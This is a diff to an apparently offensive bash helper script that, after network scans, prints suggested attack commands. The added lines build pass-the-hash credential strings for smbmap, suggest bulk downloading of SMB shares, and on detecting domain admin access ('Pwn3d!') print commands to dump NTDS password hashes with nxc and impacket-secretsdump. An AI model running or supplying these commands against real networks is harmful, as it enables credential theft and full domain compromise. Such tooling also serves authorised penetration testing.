@@ -846,9 +846,11 @@ check_and_suggest() {
             if [ -n "$domain" ]; then
                 SMBCLIENT_AUTH="-U '$domain\\$user' --pw-nt-hash $hash"
                 SMBGET_USER="$domain/$user%$hash"
+                SMBMAP_CREDS="-u '$user' -p '$hash' -d '$domain'"
             else
                 SMBCLIENT_AUTH="-U '$user' --pw-nt-hash $hash"
                 SMBGET_USER="$user%$hash"
+                SMBMAP_CREDS="-u '$user' -p '$hash'"
             fi
             XFREERDP_PASS="/pth:$hash"  # For xfreerdp3 with hash
         else
@@ -857,9 +859,11 @@ check_and_suggest() {
             if [ -n "$domain" ]; then
                 SMBCLIENT_AUTH="-U '$domain\\$user%$pass'"
                 SMBGET_USER="$domain/$user%$pass"
+                SMBMAP_CREDS="-u '$user' -p '$pass' -d '$domain'"
             else
                 SMBCLIENT_AUTH="-U '$user%$pass'"
                 SMBGET_USER="$user%$pass"
+                SMBMAP_CREDS="-u '$user' -p '$pass'"
             fi
             XFREERDP_PASS="/p:'$pass'"  # For xfreerdp3 with password
         fi
@@ -930,12 +934,19 @@ check_and_suggest() {
                         if [ ! -z "$share" ]; then
                             echo "# Download $share recursively:"
                             if [ -n "$hash" ]; then
+                                echo "# Recursively download all files (Best way):"
                                 echo "smbclient $SMBCLIENT_AUTH //$IP/$share -c 'prompt OFF;recurse ON;mget *'"
-                                echo "# Note: smbget doesn't support --pw-nt-hash, use smbclient above"
+                                echo ""
+                                echo "# Download specific file with smbmap:"
+                                echo "smbmap $SMBMAP_CREDS -H $IP --download '$share\\path\\to\\file'"
+                                echo "# Note: smbget doesn't support --pw-nt-hash"
                             else
+                                echo "# Recursively download all files (Best ways):"
                                 echo "smbget -R smb://$IP/$share -U '$SMBGET_USER'"
-                                echo "# Or with smbclient (interactive):"
                                 echo "smbclient $SMBCLIENT_AUTH //$IP/$share -c 'prompt OFF;recurse ON;mget *'"
+                                echo ""
+                                echo "# Download specific file with smbmap:"
+                                echo "smbmap $SMBMAP_CREDS -H $IP --download '$share\\path\\to\\file'"
                             fi
                             echo ""
                         fi
@@ -982,6 +993,16 @@ check_and_suggest() {
             "ldap")
                 # LDAP enumeration tools
                 echo -e "\n\033[96m[+] LDAP Enumeration Tools:\033[0m"
+                
+                # Check for Admin access (Pwn3d!)
+                if echo "$output" | grep -q "Pwn3d!"; then
+                    echo -e "\033[91m[!!!] Domain Admin access (Pwn3d!) detected! You can dump NTDS hashes.\033[0m"
+                    echo -e "\033[92m[+] Suggested exploitation commands:\033[0m"
+                    echo "nxc smb $IP $USER_FLAG --ntds"
+                    echo "impacket-secretsdump $IMPACKET_CREDS"
+                    echo ""
+                fi
+
                 if [ -n "$domain" ]; then
                     base_dn="DC=${domain//./,DC=}"
                     if [ -n "$hash" ]; then
